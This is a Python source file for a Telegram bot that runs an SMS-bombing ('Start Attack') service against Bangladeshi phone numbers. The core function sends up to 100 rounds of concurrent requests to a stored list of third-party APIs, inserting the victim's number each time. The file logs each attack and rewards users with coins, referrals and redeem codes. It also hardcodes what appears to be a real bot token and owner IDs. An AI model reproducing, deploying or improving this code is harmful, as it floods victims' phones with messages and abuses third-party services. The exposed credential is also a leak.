import httpx
import random
import string
import logging
import asyncio
import json
import html
from datetime import datetime, timedelta
from flask import Flask
from threading import Thread

from telegram import Update, ReplyKeyboardMarkup, ReplyKeyboardRemove, BotCommand, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
    ApplicationBuilder,
    CallbackQueryHandler
)
from telegram.constants import ParseMode
from telegram.error import Forbidden

# Import all database functions from database.py
import database as db
#----flask adding-----
app = Flask(__name__)

@app.route('/')
def home():
    return "Bot is running ✅"

def run_web():
    app.run(host='0.0.0.0', port=10000)

def keep_alive():
    Thread(target=run_web).start()

# --- Basic Bot Logging ---
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Bot Configuration ---
TOKEN = "8668857431:AAHJsav036WHkoIO-HUKzBLDsmRVpRTbfWk" # আপনার আসল টোকেন দিন
LOG_CHANNEL_ID = -1003828976709
OWNER_ID = 7276206449
REQUIRED_CHANNEL = "@unknown_owner_info"

# --- Helper Functions ---
def is_owner(user_id): return user_id == OWNER_ID
def is_admin(user_id):
    admins = db.load_json(db.ADMINS_FILE, []); return user_id == OWNER_ID or user_id in admins
def is_blocked(user_id):
    blocked = db.load_json(db.BLOCKED_USERS_FILE, []); return user_id in blocked
def random_string(length, charset='all'):
    chars = string.ascii_lowercase if charset == 'lower' else string.digits if charset == 'numeric' else string.ascii_letters + string.digits
    return ''.join(random.choice(chars) for _ in range(length))

# --- Channel Join Check Function ---
async def check_channel_membership(user_id: int, context: ContextTypes.DEFAULT_TYPE) -> bool:
    try:
        member = await context.bot.get_chat_member(chat_id=REQUIRED_CHANNEL, user_id=user_id)
        return member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        logger.error(f"Error checking channel membership for {user_id}: {e}")
        return False

# --- Core Bot Logic ---
async def process_requests(context: ContextTypes.DEFAULT_TYPE):
    job = context.job
    chat_id, number, amount, user_info = job.chat_id, job.data['number'], job.data['amount'], job.data['user_info']
    apis = db.load_json(db.APIS_FILE, []); total_success_count = 0
    
    number_no_zero = number[1:] if number.startswith('0') else number
    full_number = "880" + number_no_zero
    
    CONCURRENCY_LIMIT = 10
    semaphore = asyncio.Semaphore(CONCURRENCY_LIMIT)
    
    async with httpx.AsyncClient(headers={"User-Agent": "Mozilla/5.0"}, timeout=15.0) as client:
        for i in range(amount):
            tasks = []
            for api in apis:
                async def execute_request(api_config):
                    async with semaphore:
                        try:
                            url = api_config["url"]
                            method = api_config["method"]
                            data_str = api_config.get("data", "{}")
                            headers = api_config.get("headers", {})
                            
                            replacements = {"number": number, "number_no_zero": number_no_zero, "full_number": full_number, "pgen_12": random_string(12, 'numeric'), "egen_8": random_string(8, 'numeric'), "rand_32": random_string(32), "name_6": random_string(6, 'lower')}
                            for p, v in replacements.items():
                                url = url.replace("{" + p + "}", v)
                                data_str = data_str.replace("{" + p + "}", v)
                            
                            data = json.loads(data_str) if data_str != "{}" else None

                            if method == "GET":
                                return await client.get(url, headers=headers)
                            if "x-www-form-urlencoded" in headers.get("Content-Type", ""):
                                return await client.post(url, headers=headers, data=data)
                            else:
                                return await client.post(url, headers=headers, json=data)
                        except Exception as e:
                            logger.error(f"API Error ({api_config.get('name')}): {e}")
                            return None
                
                tasks.append(execute_request(api))
            
            results = await asyncio.gather(*tasks)
            for res in results:
                if res and isinstance(res, httpx.Response) and 200 <= res.status_code < 300: total_success_count += 1
            
            logger.info(f"Cycle {i+1}/{amount} for {number} completed.")
            if i < amount - 1: await asyncio.sleep(1)

    # Note: I am assuming db.update_attack_stats exists in your database.py file
    # db.update_attack_stats(user_info['id'], total_success_count)
    
    await context.bot.send_message(chat_id=chat_id, text=f"✅ Attack Finished!\n\nSent ~{total_success_count} successful requests to {number}.")
    user_mention=f"<a href='tg://user?id={user_info['id']}'>{user_info['full_name']}</a> (@{user_info['username']})"
    log_message=f"💣 <b>New Attack Log</b>\n\n👤 <b>User:</b> {user_mention}\n🆔 <b>ID:</b> <code>{user_info['id']}</code>\n🎯 <b>Target:</b> <code>{number}</code>\n🔄 <b>Rounds:</b> {amount}\n✅ <b>Success:</b> ~{total_success_count} SMS"
    try:
        await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode=ParseMode.HTML)
    except Exception as e:
        logger.error(f"Failed to send log to channel: {e}")

# --- Conversation States, Button Texts, and General Handlers ---
(GETTING_NUMBER, GETTING_AMOUNT) = range(2)
START_ATTACK_TEXT, STATISTICS_TEXT = "🧨 Start Attack", "📊 Statistics"
ACCOUNT_TEXT, BONUS_TEXT = "👤 My Account", "🎁 Daily Bonus"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user = update.effective_user
    if is_blocked(user.id): return
    
    is_new_user = str(user.id) not in db.load_json(db.USERS_FILE, {})
    if is_new_user and context.args:
        try:
            referrer_id = int(context.args[0])
            if referrer_id != user.id:
                db.store_pending_referral(user.id, referrer_id)
        except (ValueError, IndexError):
            pass

    db.add_user_to_db(user)
    
    is_member = await check_channel_membership(user.id, context)
    if not is_member:
        keyboard = [
            [InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}")],
            [InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text(
            f"⚠️ **Please Join Our Channel First!**\n\nPlease join: {REQUIRED_CHANNEL}\n\nAfter joining, click '✅ I've Joined' button below.",
            reply_markup=reply_markup, parse_mode=ParseMode.MARKDOWN
        )
        return
    
    reply_keyboard = [[START_ATTACK_TEXT], [ACCOUNT_TEXT, BONUS_TEXT], [STATISTICS_TEXT]]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    
    credit_text = "This bot is made by <a href='https://t.me/Unkonwn_BMT'>Unknown</a>."
    await update.message.reply_html(rf"Hi {user.mention_html()}! Welcome..." + f"\n\n{credit_text}", disable_web_page_preview=True)
    await update.message.reply_text("Please select an option:", reply_markup=markup)

async def check_join_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    
    if await check_channel_membership(user.id, context):
        referrer_id = db.get_pending_referrer(user.id)
        if referrer_id:
            db.add_coins(referrer_id, 5)
            db.complete_referral(user.id)
            try:
                await context.bot.send_message(chat_id=referrer_id, text=f"🎉 Congratulations! User {html.escape(user.full_name)} joined via your link.\nYou earned **5 coins**!", parse_mode=ParseMode.MARKDOWN)
            except Exception as e:
                logger.warning(f"Failed to notify referrer {referrer_id}: {e}")

        await query.edit_message_text("🎉 Thanks for joining!")
        await start(query.message, context)
    else:
        await query.edit_message_text("❌ You haven't joined yet. Please join the channel and click the button again.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📢 Join Channel", url=f"https://t.me/{REQUIRED_CHANNEL[1:]}"), InlineKeyboardButton("✅ I've Joined", callback_data="check_join")]])
        )

async def my_account(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_blocked(user.id): return
    
    user_data = db.get_user_data(user.id)
    bot_username = (await context.bot.get_me()).username
    referral_link = f"https://t.me/{bot_username}?start={user.id}"
    
    account_text = (f"👤 **My Account**\n\n🆔 **User ID:** `{user.id}`\n💰 **Coins:** {user_data.get('coins', 0)}\n\n"
                    f"🔗 **Your Referral Link:**\n`{referral_link}`\n\nShare this to get 5 coins when a friend joins!")
    await update.message.reply_text(account_text, parse_mode=ParseMode.MARKDOWN)

async def daily_bonus(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if is_blocked(user.id): return
    
    if db.claim_bonus(user.id):
        # <<< পরিবর্তন: সফলতার মেসেজ 5 থেকে 3 কয়েন করা হয়েছে
        await update.message.reply_text(f"🎉 You received 3 bonus coins.\n\n💰 Your new balance is {db.get_user_coins(user.id)} coins.")
    else:
        await update.message.reply_text(f"❌ You have already claimed your daily bonus. Try again after 12 AM BD Time.")

async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    if not context.args:
        await update.message.reply_text("Usage: `/redeem YOUR-CODE`")
        return
    
    code = context.args[0].strip()
    if db.is_valid_code(code) and db.use_redeem_code(code):
        db.add_coins(user.id, 5)
        await update.message.reply_text(f"✅ Code redeemed! **5 coins** added.\n\n💰 Your new balance is {db.get_user_coins(user.id)} coins.", parse_mode=ParseMode.MARKDOWN)
        
        # <<< নতুন সংযোজন: রিডিম কোড ব্যবহারের লগ পাঠানো হবে
        try:
            user_mention = f"<a href='tg://user?id={user.id}'>{html.escape(user.full_name)}</a> (@{user.username or 'N/A'})"
            log_message = (
                f"🎁 <b>Code Redeemed</b>\n\n"
                f"👤 <b>User:</b> {user_mention}\n"
                f"🆔 <b>ID:</b> <code>{user.id}</code>\n"
                f"🔑 <b>Code:</b> <code>{html.escape(code)}</code>\n"
                f"💰 <b>Coins Added:</b> 5"
            )
            await context.bot.send_message(chat_id=LOG_CHANNEL_ID, text=log_message, parse_mode=ParseMode.HTML)
        except Exception as e:
            logger.error(f"Failed to send redeem log to channel: {e}")
            
    else:
        await update.message.reply_text("❌ Invalid or already used code.")

async def statistics_command(update, context):
    if is_blocked(update.effective_user.id): return
    stats = db.load_json(db.STATS_FILE, {"total_users": 0, "total_sms_sent": 0})
    await update.message.reply_text(f"📊 **Bot Statistics**\n\n👥 Total Users: {stats['total_users']}\n💥 Total SMS Sent: {stats['total_sms_sent']}", parse_mode=ParseMode.MARKDOWN)

async def attack_conversation_start(update, context) -> int:
    user = update.effective_user
    if is_blocked(user.id): return ConversationHandler.END
    if not await check_channel_membership(user.id, context):
        await update.message.reply_text("❌ Please join our channel first to use this bot.")
        return ConversationHandler.END

    if db.get_user_coins(user.id) < 1:
        await update.message.reply_text("❌ You don't have enough coins (costs 1). Claim your bonus or refer friends.")
        return ConversationHandler.END
    
    await update.message.reply_text(f"📲 Please enter the target phone number.\n💰 You have {db.get_user_coins(user.id)} coins.", reply_markup=ReplyKeyboardRemove())
    return GETTING_NUMBER
    
async def get_number(update, context):
    number = update.message.text
    if not (number.startswith("01") and len(number) == 11 and number.isdigit()):
        await update.message.reply_text("❌ Invalid phone number. Please enter a valid 11-digit number.")
        return GETTING_NUMBER
    context.user_data['number'] = number
    await update.message.reply_text("🔢 Now, enter the amount (Max: 100).")
    return GETTING_AMOUNT

async def get_amount_and_process(update, context):
    amount_str = update.message.text
    if not amount_str.isdigit() or not (0 < int(amount_str) <= 100):
        await update.message.reply_text("❌ Invalid amount. Please enter a number between 1 and 100.")
        return GETTING_AMOUNT
        
    user = update.effective_user
    if not db.use_coin(user.id):
        await update.message.reply_text("❌ An error occurred with your coin balance. Please try again.")
        return ConversationHandler.END

    amount, number = int(amount_str), context.user_data['number']
    reply_keyboard = [[START_ATTACK_TEXT], [ACCOUNT_TEXT, BONUS_TEXT], [STATISTICS_TEXT]]
    markup = ReplyKeyboardMarkup(reply_keyboard, resize_keyboard=True)
    
    await update.message.reply_text(f"🚀 Attack started on `{number}` for `{amount}` rounds.\n💰 You have {db.get_user_coins(user.id)} coins left.", parse_mode=ParseMode.MARKDOWN, reply_markup=markup)
    
    user_info = {'id': user.id, 'full_name': user.full_name, 'username': user.username or 'N/A'}
    context.application.job_queue.run_once(process_requests, 1, data={'number': number, 'amount': amount, 'user_info': user_info}, chat_id=update.effective_chat.id)
    context.user_data.clear()
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if context.user_data:
        context.user_data.clear()
    await update.message.reply_text("Operation cancelled.")
    await start(update, context)
    return ConversationHandler.END

# --- Admin Panel ---
async def admin_panel(update, context):
    if not is_admin(update.effective_user.id): return
    text = (
        "👑 *Admin Panel*\n\n"
        "`/gencode` - Generate 5 new redeem codes.\n"
        "`/userstats` - View all user stats.\n"
        "`/broadcast <msg>` - Send a message to all users.\n"
        "`/block <id>` - Block a user.\n"
        "`/unblock <id>` - Unblock a user."
    )
    if is_owner(update.effective_user.id):
        text += (
            "\n\n🔑 *Owner Commands*\n"
            "`/addadmin <id>` - Add a new admin.\n"
            "`/removeadmin <id>` - Remove an admin.\n"
            "`/listadmins` - See all admins."
        )
    await update.message.reply_text(text, parse_mode=ParseMode.MARKDOWN)

async def generate_code_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    codes_text = "\n".join([f"`{db.generate_redeem_code()}`" for _ in range(5)])
    await update.message.reply_text(f"✨ **5 new redeem codes** generated:\n\n{codes_text}\n\nEach is worth **5 coins**.", parse_mode=ParseMode.MARKDOWN)

# --- Other Admin Commands ---
# (Adding them back to ensure the file is complete)
async def userstats(update, context):
    if not is_admin(update.effective_user.id): return
    user_data = db.load_json(db.USER_DATA_FILE, {})
    users = db.load_json(db.USERS_FILE, {})
    if not user_data:
        await update.message.reply_text("📊 No user statistics available yet.")
        return
    
    stats_text = "📊 <b>Top 20 User Statistics</b>\n\n"
    sorted_users = sorted(user_data.items(), key=lambda item: item[1].get('sms_sent', 0), reverse=True)
    
    for user_id, data in sorted_users[:20]:
        user_info = users.get(user_id, {"full_name": "Unknown", "username": "N/A"})
        safe_name = html.escape(user_info['full_name'])
        safe_username = html.escape(user_info.get('username', 'N/A'))
        stats_text += f"👤 {safe_name} (@{safe_username})\n🆔 {user_id} | 💥 {data.get('sms_sent', 0)} SMS | 💰 {data.get('coins', 0)} Coins\n\n"
    
    await update.message.reply_text(stats_text, parse_mode=ParseMode.HTML)

async def block_user(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("❌ Usage: /block <user_id>")
        return
    
    user_id = int(context.args[0])
    blocked = db.load_json(db.BLOCKED_USERS_FILE, [])
    if user_id in blocked:
        await update.message.reply_text(f"❌ User {user_id} is already blocked.")
        return
    
    blocked.append(user_id)
    db.save_json(db.BLOCKED_USERS_FILE, blocked)
    await update.message.reply_text(f"✅ User {user_id} has been blocked.")

async def unblock_user(update, context):
    if not is_admin(update.effective_user.id): return
    if not context.args or not context.args[0].isdigit():
        await update.message.reply_text("❌ Usage: /unblock <user_id>")
        return
    
    user_id = int(context.args[0])
    blocked = db.load_json(db.BLOCKED_USERS_FILE, [])
    if user_id not in blocked:
        await update.message.reply_text(f"❌ User {user_id} is not blocked.")
        return
    
    blocked.remove(user_id)
    db.save_json(db.BLOCKED_USERS_FILE, blocked)
    await update.message.reply_text(f"✅ User {user_id} has been unblocked.")


async def post_init(application: Application):
    await application.bot.set_my_commands([
        BotCommand("start", "Start the bot"),
        BotCommand("redeem", "Redeem a code for coins"),
        BotCommand("admin", "Admin panel (Admins only)"),
    ])
    logger.info("Custom commands set!")

def main():
    db.initialize_files()
    application = ApplicationBuilder().token(TOKEN).post_init(post_init).build()
    
    attack_conv = ConversationHandler(
        entry_points=[MessageHandler(filters.Text(START_ATTACK_TEXT), attack_conversation_start)],
        states={
            GETTING_NUMBER:[MessageHandler(filters.TEXT & ~filters.COMMAND, get_number)],
            GETTING_AMOUNT:[MessageHandler(filters.TEXT & ~filters.COMMAND, get_amount_and_process)]
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )
    application.add_handler(attack_conv)

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("redeem", redeem_command))
    application.add_handler(CallbackQueryHandler(check_join_callback, pattern="^check_join$"))
    
    application.add_handler(MessageHandler(filters.Text(STATISTICS_TEXT), statistics_command))
    application.add_handler(MessageHandler(filters.Text(ACCOUNT_TEXT), my_account))
    application.add_handler(MessageHandler(filters.Text(BONUS_TEXT), daily_bonus))
    
    admin_filter = filters.User(user_id=db.load_json(db.ADMINS_FILE, []) + [OWNER_ID])
    application.add_handler(CommandHandler("admin", admin_panel, filters=admin_filter))
    application.add_handler(CommandHandler("gencode", generate_code_command, filters=admin_filter))
    application.add_handler(CommandHandler("userstats", userstats, filters=admin_filter))
    application.add_handler(CommandHandler("block", block_user, filters=admin_filter))
    application.add_handler(CommandHandler("unblock", unblock_user, filters=admin_filter))
    
    print("Bot is running!")
    application.run_polling()

if __name__ == "__main__":
    main()
